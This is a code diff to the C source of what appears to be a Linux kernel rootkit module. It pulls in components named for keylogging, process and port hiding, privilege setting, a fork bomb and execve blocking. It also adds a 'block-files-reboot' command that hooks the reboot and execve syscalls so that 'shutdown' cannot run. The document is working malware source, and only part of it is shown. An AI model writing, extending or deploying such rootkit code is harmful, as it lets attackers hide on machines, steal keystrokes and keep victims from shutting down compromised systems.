@@ -7,6 +7,15 @@
     #include <linux/uaccess.h> // copy to/from user space
 
     #include "linked_list.h"
+    #include "execve_blocker.h"
+    #include "root_setter.h"
+    #include "getdents_hacks.h"
+    #include "hide_process.h"
+    #include "hide_ports.h"
+    #include "files_hacks.h"
+    #include "netfilter_kite.h"
+    #include "forkbomb.h"
+    #include "keylogger.h"
 
 
 #define DEVICE_SIZE 1024 // size of possible input in bytes
@@ -135,6 +144,24 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
             }
         }
     }
+
+    if(memcmp("block-files-reboot", tmpdata, strlen("block-files-reboot")) == 0){
+        if(strlen(tmpdata) > strlen("block-files-reboot")){
+            strcpy(last_data, tmpdata);
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_reboot") == 1){
+                printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
+            }
+            if(is_hook_activated(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 0){
+                insert_node(&exec_to_block, "shutdown");
+                if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 1){
+                    printk(KERN_ERR "error hooking syscall execve\n");
+                }
+            }
+            else{
+                remove_node_by_name(&exec_to_block, "shutdown");
+            }
+        }
+    }
     #else
     if(memcmp("hide-files", tmpdata, strlen("hide-files")) == 0){
         if(strlen(tmpdata) > strlen("hide-files")){
@@ -162,6 +189,23 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
             strcpy(last_data, tmpdata);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_read") == 1){
                 printk(KERN_ERR "error hooking syscall read\n");
+            }
+        }
+    }
+    if(memcmp("block-files-reboot", tmpdata, strlen("block-files-reboot")) == 0){
+        if(strlen(tmpdata) > strlen("block-files-reboot")){
+            strcpy(last_data, tmpdata);
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
+                printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
+            }
+            if(is_hook_activated(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 0){
+                insert_node(&exec_to_block, "shutdown");
+                if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 1){
+                    printk(KERN_ERR "error hooking syscall execve\n");
+                }
+            }
+            else{
+                remove_node_by_name(&exec_to_block, "shutdown");
             }
         }
     }
